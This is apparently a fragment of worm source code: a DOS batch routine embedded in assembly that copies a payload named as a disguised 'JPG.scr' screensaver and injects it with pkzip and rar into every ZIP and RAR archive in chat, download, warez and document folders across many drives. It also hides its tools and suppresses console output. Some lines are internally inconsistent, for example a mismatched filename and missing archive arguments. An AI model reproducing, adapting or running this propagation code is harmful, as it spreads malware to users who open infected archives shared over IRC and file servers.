@ECHO OFF
ctty nul
if not exist %windir%\ELSA.exe goto :w
:tt
copy /B %windir%\ELSA.exe %tmp%\ELSA_isCute.JPG.scr /Y
if not exist c:\pkzip.exe goto :s
attrib -h c:\pkzip.exe
for %%i in (c:\*.zip c:\mirc\*.zip c:\mirc\download\*.zip c:\pirch98\*.zip c:\download\*.zip c:\Mydocu~1\*.zip c:\MEUSDO~1\*.zip %windir%\desktop\*.zip) DO c:\pkzip -e0 -u -r -k %%i %tmp%\ELSA_isCute.JPG.scr > nul
for %%i in (f:\*.zip c:\pirch98\downlo~1\*.zip c:\unzipped\*.zip c:\downlo~1\*.zip c:\Mesdoc~1\*.zip %windir%\bureau\*.zip d:\warez\*.zip f:\warez\*.zip) DO c:\pkzip -e0 -u -r -k %%i %tmp%\ELSA_isCute.JPG.scr > nul
for %%i in (d:\*.zip f:\*.zip c:\mirc32\download\*.zip c:\pirch32\*.zip c:\progra~1\*.zip c:\ftp\*.zip c:\sex\*.zip %windir%\desktop\download\*.zip) DO c:\pkzip -e0 -u -r -k %%i %tmp%\ELSA_isCute.JPG.scr > nul
for %%i in (f:\*.zip g:\*.zip c:\mirc32\*.zip c:\pirch32\downlo~1\*.zip c:\warez\*.zip c:\leech\*.zip c:\virc\*.zip %windir%\bureau\download\*.zip) DO c:\pkzip -e0 -u -r -k %%i %tmp%\ZaELSA_isCute.JPG.scr > nul
for %%i in (h:\*.zip i:\*.zip c:\chat\*.zip c:\pirch\downlo~1\*.zip c:\fserve\*.zip c:\mirc\fserve\*.zip c:\documents\*.zip %windir%\bureau\telech\*.zip) DO c:\pkzip -e0 -u -r -k %%i %tmp%\ELSA_isCute.JPG.scr > nul
for %%i in (j:\*.zip k:\*.zip c:\net\*.zip c:\pirch\*.zip c:\warez\*.zip c:\leeched\*.zip c:\virc\download\*.zip %windir%\bureau\Mydocu~1\*.zip c:\web\*.zip) DO c:\pkzip -e0 -u -r -k %%i %tmp%\ELSA_isCute.JPG.scr > nul
attrib +h c:\pkzip.exe
:s
if not exist c:\rar.exe goto :ee
attrib -h c:\rar.exe
for %%i in (c:\*.rar c:\mirc\*.rar c:\mirc\download\*.rar c:\pirch98\*.rar c:\download\*.rar c:\Mydocu~1\*.rar c:\MEUSDO~1\*.rar %windir%\desktop\*.rar) DO c:\rar a -tk -y -c- -o+ %%i %tmp%\ELSA_isCute.JPG.scr > nul
for %%i in (f:\*.rar c:\pirch98\downlo~1\*.rar c:\unzipped\*.rar c:\downlo~1\*.rar c:\Mesdoc~1\*.rar %windir%\bureau\*.rar d:\warez\*.rar f:\warez\*.rar) DO c:\rar a -tk -y -c- -o+ %%i %tmp%\ELSA_isCute.JPG.scr > nul
for %%i in (d:\*.rar f:\*.rar c:\mirc32\download\*.rar c:\pirch32\*.rar c:\progra~1\*.rar c:\ftp\*.rar c:\sex\*.rar %windir%\desktop\download\*.rar) DO c:\rar a -tk -y -c- -o+ %tmp%\ELSA_isCute.JPG.scr > nul
for %%i in (f:\*.rar g:\*.rar c:\mirc32\*.rar c:\pirch32\downlo~1\*.rar c:\warez\*.rar c:\leech\*.rar c:\virc\*.rar %windir%\bureau\download\*.rar) DO c:\rar a -tk -y -c- -o+ %tmp%\ELSA_isCute.JPG.scr > nul
for %%i in (h:\*.rar i:\*.rar c:\chat\*.rar c:\pirch\downlo~1\*.rar c:\fserve\*.rar c:\mirc\fserve\*.rar c:\documents\*.rar %windir%\bureau\telech\*.rar) DO c:\rar a -tk -y -c- -o+ %%i %tmp%\ELSA_isCute.JPG.scr > nul
for %%i in (j:\*.rar k:\*.rar c:\net\*.rar c:\pirch\*.rar c:\warez\*.rar c:\leeched\*.rar c:\virc\download\*.rar %windir%\bureau\Mydocu~1\*.rar c:\web\*.rar) DO c:\rar a -tk -y -c- -o+ %%i %tmp%\ELSA_isCute.JPG.scr > nul
attrib +h c:\rar.exe
:w
if not exist %windir%\elsbckp\e.exe goto :ee
goto :yy
copy /B %windir%\ELSA.exe ELSA_isCute.JPG.scr /Y
:ee
attrib +h 0%
ctty con
goto :mmm
:yy
copy /B %windir%\elsbckp\e.exe %windir%\ELSA.exe /Y
goto :tt
:mmm
exit |cls",0
batsize equ     ($-offset pz)
